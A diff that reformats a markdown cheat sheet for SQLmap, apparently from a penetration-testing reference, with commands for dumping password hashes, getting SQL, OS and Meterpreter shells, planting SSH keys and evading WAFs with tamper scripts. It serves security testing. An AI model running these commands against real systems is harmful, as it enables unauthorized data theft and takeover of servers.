@@ -1,13 +1,9 @@
 # SQLmap
 
-> SQLmap is a powerful tool that automates the detection and exploitation of SQL injection vulnerabilities, saving time and effort compared to manual testing. It supports a wide range of databases and injection techniques, making it versatile and effective in various scenarios. 
-
+> SQLmap is a powerful tool that automates the detection and exploitation of SQL injection vulnerabilities, saving time and effort compared to manual testing. It supports a wide range of databases and injection techniques, making it versatile and effective in various scenarios.
 > Additionally, SQLmap can retrieve data, manipulate databases, and even execute commands, providing a robust set of features for penetration testers and security analysts.
-
 > Reinventing the wheel isn't ideal because SQLmap has been rigorously developed, tested, and improved by experts. Using a reliable, community-supported tool means you benefit from established best practices and avoid the high risk of missing vulnerabilities or introducing errors in custom code.
-
->However you should always know how SQLmap is working, and be able to replicate it manually if necessary.
-
+> However you should always know how SQLmap is working, and be able to replicate it manually if necessary.
 
 ## Summary
 
@@ -25,13 +21,11 @@
 * [SQLmap Without SQL Injection](#sqlmap-without-sql-injection)
 * [References](#references)
 
-
 ## Basic Arguments For SQLmap
 
 ```powershell
 sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
 ```
-
 
 ## Load A Request File
 
@@ -40,7 +34,6 @@ A request file in SQLmap is a saved HTTP request that SQLmap reads and uses to p
 ```powershell
 sqlmap -r request.txt
 ```
-
 
 ## Custom Injection Point
 
@@ -52,39 +45,40 @@ By defining a custom injection point with the wildcard character '`*`' , you hav
 python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
 ```
 
-
 ## Second Order Injection
 
-A second-order SQL injection occurs when malicious SQL code injected into an application is not executed immediately but is instead stored in the database and later used in another SQL query. 
+A second-order SQL injection occurs when malicious SQL code injected into an application is not executed immediately but is instead stored in the database and later used in another SQL query.
 
 ```powershell
 sqlmap -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
 sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
 ```
 
-
 ## Getting A Shell
 
-* SQL Shell: 
+* SQL Shell:
+
     ```ps1
     python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell
     ```
 
-* OS Shell: 
+* OS Shell:
+
     ```ps1
     python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell
     ```
-    
-* Meterpreter: 
+
+* Meterpreter:
+
     ```ps1
     python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn
     ```
 
-* SSH Shell: 
+* SSH Shell:
+
     ```ps1
     python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
     ```
-
 
 ## Crawl And Auto-Exploit
 
@@ -98,7 +92,6 @@ sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threa
 * `--crawl` = How deep you want to crawl a site
 * `--forms` = Parse and test forms
 
-
 ## Proxy Configuration For SQLmap
 
 To run SQLmap with a proxy, you can use the `--proxy` option followed by the proxy URL. SQLmap supports various types of proxies such as HTTP, HTTPS, SOCKS4, and SOCKS5.
@@ -109,22 +102,25 @@ sqlmap -u "http://www.target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" 
 ```
 
 * HTTP Proxy:
+
     ```ps1
     --proxy="http://[username]:[password]@[proxy_ip]:[proxy_port]"
     --proxy="http://user:pass@127.0.0.1:8080"
     ```
+
 * SOCKS Proxy:
+
     ```ps1
     --proxy="socks4://[username]:[password]@[proxy_ip]:[proxy_port]"
     --proxy="socks4://user:pass@127.0.0.1:1080"
     ```
 
 * SOCKS5 Proxy:
+
     ```ps1
     --proxy="socks5://[username]:[password]@[proxy_ip]:[proxy_port]"
     --proxy="socks5://user:pass@127.0.0.1:1080"
     ```
-
 
 ## Injection Tampering
 
@@ -139,7 +135,6 @@ python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
 * `--suffix=SUFFIX`: Injection payload suffix string
 * `--prefix=PREFIX`: Injection payload prefix string
 
-
 ### Tamper Scripts
 
 A tamper script  is a script that modifies the SQL injection payloads to evade detection by WAFs or other security mechanisms. SQLmap comes with a variety of pre-built tamper scripts that can be used to automatically adjust payloads
@@ -150,7 +145,7 @@ sqlmap -u "http://targetwebsite.com/vulnerablepage.php?id=1" --tamper=space2comm
 
 | Tamper | Description |
 | --- | --- |
-|0x2char.py | Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),…) counterpart |
+|0x2char.py | Replaces each (MySQL) 0xHEX encoded string with equivalent CONCAT(CHAR(),…) counterpart |
 |apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |
 |apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart|
 |appendnullbyte.py | Appends encoded NULL byte character at the end of payload |
@@ -172,7 +167,7 @@ sqlmap -u "http://targetwebsite.com/vulnerablepage.php?id=1" --tamper=space2comm
 |greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart |
 |halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |
 |htmlencode.py | HTML encode (using code points) all non-alphanumeric characters (e.g. ‘ -> &#39;) |
-|ifnull2casewhenisnull.py | Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart| 
+|ifnull2casewhenisnull.py | Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart|
 |ifnull2ifisnull.py | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'|
 |informationschemacomment.py | Add an inline comment (/**/) to the end of all occurrences of (MySQL) “information_schema” identifier |
 |least.py | Replaces greater than operator (‘>’) with ‘LEAST’ counterpart |
@@ -200,7 +195,7 @@ sqlmap -u "http://targetwebsite.com/vulnerablepage.php?id=1" --tamper=space2comm
 |space2mysqldash.py | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n') |
 |space2plus.py |  Replaces space character (' ') with plus ('+')  |
 |space2randomblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
-|symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (&& and ||) |
+|symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (&& and \|\|) |
 |unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |
 |unmagicquotes.py | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |
 |uppercase.py | Replaces each keyword character with upper case value 'INSERT'|
@@ -208,7 +203,6 @@ sqlmap -u "http://targetwebsite.com/vulnerablepage.php?id=1" --tamper=space2comm
 |versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |
 |versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
 |xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For' |
-
 
 ## Reduce Requests Number
 
@@ -219,7 +213,7 @@ sqlmap -u "https://www.target.com/page.php?category=demo" -p category --test-fil
 sqlmap -u "https://www.target.com/page.php?category=demo" --test-filter="boolean"
 ```
 
-By default, SQLmap runs with level 1 and risk 1, which generates fewer requests. Increasing these values without a purpose may lead to a larger number of tests that are time-consuming and unnecessary. 
+By default, SQLmap runs with level 1 and risk 1, which generates fewer requests. Increasing these values without a purpose may lead to a larger number of tests that are time-consuming and unnecessary.
 
 ```ps1
 sqlmap -u "https://www.target.com/page.php?id=1" --level=1 --risk=1
@@ -231,10 +225,9 @@ Use the `--technique` option to specify the types of SQL injection techniques to
 sqlmap -u "https://www.target.com/page.php?id=1" --technique=B
 ```
 
-
 ## SQLmap Without SQL Injection
 
-Using SQLmap without exploiting SQL injection vulnerabilities can still be useful for various legitimate purposes, particularly in security assessments, database management, and application testing. 
+Using SQLmap without exploiting SQL injection vulnerabilities can still be useful for various legitimate purposes, particularly in security assessments, database management, and application testing.
 
 You can use SQLmap to access a database via its port instead of a URL.
 
@@ -242,8 +235,7 @@ You can use SQLmap to access a database via its port instead of a URL.
 sqlmap.py -d "mysql://user:pass@ip/database" --dump-all
 ```
 
-
 ## References
 
-- [#SQLmap protip - @zh4ck - March 10, 2018](https://twitter.com/zh4ck/status/972441560875970560)
-- [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper - Mehmet Ince - August 1, 2017](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)
+* [#SQLmap protip - @zh4ck - March 10, 2018](https://twitter.com/zh4ck/status/972441560875970560)
+* [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper - Mehmet Ince - August 1, 2017](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)
